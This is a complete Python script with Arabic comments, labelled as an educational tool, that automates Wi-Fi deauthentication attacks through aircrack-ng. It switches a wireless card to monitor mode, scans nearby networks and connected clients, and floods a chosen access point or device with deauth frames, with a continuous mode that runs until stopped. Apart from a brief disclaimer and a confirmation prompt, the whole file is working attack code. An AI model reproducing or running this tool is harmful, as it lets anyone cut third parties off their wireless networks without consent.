#!/usr/bin/env python3
"""
أداة تعليمية لهجوم Deauthentication
ملاحظة: للاستخدام التعليمي والاختبار على الشبكات المملوكة لك فقط
"""

import subprocess
import time
import sys
import argparse
from threading import Thread, Event

class DeauthAttack:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor_interface = "wlan0mon"
        self.stop_attack = Event()
        
    def check_dependencies(self):
        """التحقق من تثبيت الأدوات المطلوبة"""
        try:
            subprocess.run(["aireplay-ng", "--version"], capture_output=True, check=True)
            subprocess.run(["airmon-ng", "--version"], capture_output=True, check=True)
            subprocess.run(["airodump-ng", "--version"], capture_output=True, check=True)
            print("✓ جميع الأدوات المطلوبة مثبتة")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("✗ يجب تثبيت aircrack-ng أولاً")
            return False
    
    def enable_monitor_mode(self):
        """تفعيل وضع المراقبة"""
        try:
            print("إيقاف خدمات الشبكة...")
            subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
            subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant"], check=True)
            
            print("تفعيل وضع المراقبة...")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            subprocess.run(["sudo", "airmon-ng", "start", self.interface], check=True)
            
            print("✓ تم تفعيل وضع المراقبة")
            return True
        except subprocess.CalledProcessError as e:
            print(f"✗ خطأ في تفعيل وضع المراقبة: {e}")
            return False
    
    def disable_monitor_mode(self):
        """تعطيل وضع المراقبة"""
        try:
            print("تعطيل وضع المراقبة...")
            subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface], check=True)
            subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], check=True)
            print("✓ تم تعطيل وضع المراقبة")
        except subprocess.CalledProcessError as e:
            print(f"✗ خطأ في تعطيل وضع المراقبة: {e}")
    
    def scan_networks(self, duration=10):
        """مسح الشبكات المتاحة"""
        print(f"جاري مسح الشبكات لمدة {duration} ثواني...")
        
        try:
            process = subprocess.Popen(
                ["sudo", "airodump-ng", self.monitor_interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(duration)
            process.terminate()
            stdout, stderr = process.communicate()
            
            # عرض الشبكات المكتشفة
            print("\n" + "="*50)
            print("الشبكات المكتشفة:")
            print("="*50)
            
            networks = []
            for line in stdout.split('\n'):
                if len(line) > 0 and not line.startswith('BSSID'):
                    parts = line.split()
                    if len(parts) >= 14:
                        bssid = parts[0]
                        channel = parts[5]
                        # SSID قد يكون مكون من عدة كلمات
                        ssid = ' '.join(parts[13:]) if len(parts) > 13 else "Hidden"
                        
                        if bssid != "BSSID" and channel.isdigit():
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'ssid': ssid
                            })
                            print(f"BSSID: {bssid} | Channel: {channel} | SSID: {ssid}")
            
            return networks
            
        except Exception as e:
            print(f"✗ خطأ في المسح: {e}")
            return []
    
    def scan_clients(self, bssid, channel, duration=10):
        """مسح العملاء المتصلين بشبكة محددة"""
        print(f"جاري مسح العملاء على الشبكة {bssid}...")
        
        try:
            cmd = [
                "sudo", "airodump-ng",
                "-c", channel,
                "--bssid", bssid,
                self.monitor_interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(duration)
            process.terminate()
            stdout, stderr = process.communicate()
            
            clients = []
            for line in stdout.split('\n'):
                if "STATION" in line:
                    continue
                parts = line.split()
                if len(parts) >= 6:
                    client_mac = parts[0]
                    if len(client_mac) == 17:  # تأكد أنه عنوان MAC
                        clients.append(client_mac)
                        print(f"عميل مكتشف: {client_mac}")
            
            return clients
            
        except Exception as e:
            print(f"✗ خطأ في مسح العملاء: {e}")
            return []
    
    def deauth_network(self, bssid, channel, count=10):
        """هجوم deauth على شبكة كاملة"""
        try:
            print(f"بدء هجوم Deauth على الشبكة {bssid}...")
            
            cmd = [
                "sudo", "aireplay-ng",
                "--deauth", str(count),
                "-a", bssid,
                self.monitor_interface
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            if process.returncode == 0:
                print(f"✓ تم إرسال {count} حزمة deauth بنجاح")
            else:
                print(f"✗ فشل في إرسال حزم deauth")
                
        except Exception as e:
            print(f"✗ خطأ في هجوم deauth: {e}")
    
    def deauth_client(self, bssid, client_mac, count=10):
        """هجوم deauth على عميل محدد"""
        try:
            print(f"بدء هجوم Deauth على العميل {client_mac}...")
            
            cmd = [
                "sudo", "aireplay-ng",
                "--deauth", str(count),
                "-a", bssid,
                "-c", client_mac,
                self.monitor_interface
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            if process.returncode == 0:
                print(f"✓ تم إرسال {count} حزمة deauth للعميل {client_mac}")
            else:
                print(f"✗ فشل في إرسال حزم deauth للعميل")
                
        except Exception as e:
            print(f"✗ خطأ في هجوم deauth للعميل: {e}")
    
    def continuous_deauth(self, bssid, client_mac=None, interval=10):
        """هجوم deauth مستمر"""
        def deauth_loop():
            packet_count = 0
            while not self.stop_attack.is_set():
                try:
                    if client_mac:
                        cmd = [
                            "sudo", "aireplay-ng",
                            "--deauth", str(interval),
                            "-a", bssid,
                            "-c", client_mac,
                            self.monitor_interface
                        ]
                    else:
                        cmd = [
                            "sudo", "aireplay-ng",
                            "--deauth", str(interval),
                            "-a", bssid,
                            self.monitor_interface
                        ]
                    
                    subprocess.run(cmd, capture_output=True)
                    packet_count += interval
                    print(f"تم إرسال {packet_count} حزمة deauth...")
                    
                except Exception as e:
                    print(f"✗ خطأ في الهجوم المستمر: {e}")
                    break
        
        print("بدء الهجوم المستمر... اضغط Ctrl+C لإيقافه")
        thread = Thread(target=deauth_loop)
        thread.start()
        return thread
    
    def cleanup(self):
        """تنظيف الموارد"""
        self.stop_attack.set()
        time.sleep(2)
        self.disable_monitor_mode()

def main():
    parser = argparse.ArgumentParser(description='أداة Deauth التعليمية')
    parser.add_argument('-i', '--interface', default='wlan0', help='واجهة الواي فاي')
    parser.add_argument('-c', '--channel', help='قناة الشبكة')
    parser.add_argument('-b', '--bssid', help='BSSID الشبكة المستهدفة')
    parser.add_argument('-t', '--target', help='عنوان MAC العميل المستهدف')
    parser.add_argument('-n', '--count', type=int, default=10, help='عدد حزم Deauth')
    parser.add_argument('--continuous', action='store_true', help='هجوم مستمر')
    
    args = parser.parse_args()
    
    attack = DeauthAttack()
    attack.interface = args.interface
    
    print("أداة Deauth التعليمية - للأغراض التعليمية فقط")
    print("=" * 50)
    
    # التحقق من التبعيات
    if not attack.check_dependencies():
        sys.exit(1)
    
    try:
        # تفعيل وضع المراقبة
        if not attack.enable_monitor_mode():
            sys.exit(1)
        
        networks = attack.scan_networks()
        
        if not args.bssid and networks:
            print("\nاختر شبكة للهجوم:")
            for i, net in enumerate(networks):
                print(f"{i+1}. {net['ssid']} ({net['bssid']})")
            
            choice = input("\nأدخل رقم الشبكة: ")
            if choice.isdigit() and 1 <= int(choice) <= len(networks):
                selected = networks[int(choice)-1]
                args.bssid = selected['bssid']
                args.channel = selected['channel']
            else:
                print("✗ اختيار غير صحيح")
                sys.exit(1)
        
        if not args.bssid:
            print("✗ يجب تحديد BSSID")
            sys.exit(1)
        
        # مسح العملاء إذا لم يتم تحديد عميل
        if not args.target:
            clients = attack.scan_clients(args.bssid, args.channel)
            if clients:
                print("\nاختر عميل للهجوم (أدخل 0 للهجوم على الشبكة كاملة):")
                for i, client in enumerate(clients):
                    print(f"{i+1}. {client}")
                
                choice = input("\nأدخل رقم العميل: ")
                if choice.isdigit():
                    if int(choice) > 0 and int(choice) <= len(clients):
                        args.target = clients[int(choice)-1]
        
        # تنفيذ الهجوم
        if args.continuous:
            # هجوم مستمر
            thread = attack.continuous_deauth(args.bssid, args.target)
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nإيقاف الهجوم...")
                attack.stop_attack.set()
                thread.join()
                
        else:
            # هجوم لمرة واحدة
            if args.target:
                attack.deauth_client(args.bssid, args.target, args.count)
            else:
                attack.deauth_network(args.bssid, args.channel, args.count)
        
    except KeyboardInterrupt:
        print("\nتم إيقاف البرنامج")
    except Exception as e:
        print(f"✗ خطأ غير متوقع: {e}")
    finally:
        attack.cleanup()

if __name__ == "__main__":
    # تحذير أمني
    print("⚠️  تحذير: هذا البرنامج للأغراض التعليمية فقط")
    print("استخدامه على شبكات الآخرين بدون إذن غير قانوني")
    
    response = input("هل تريد المتابعة؟ (نعم/لا): ")
    if response.lower() in ['نعم', 'yes', 'y']:
        main()
    else:
        print("تم إلغاء التشغيل")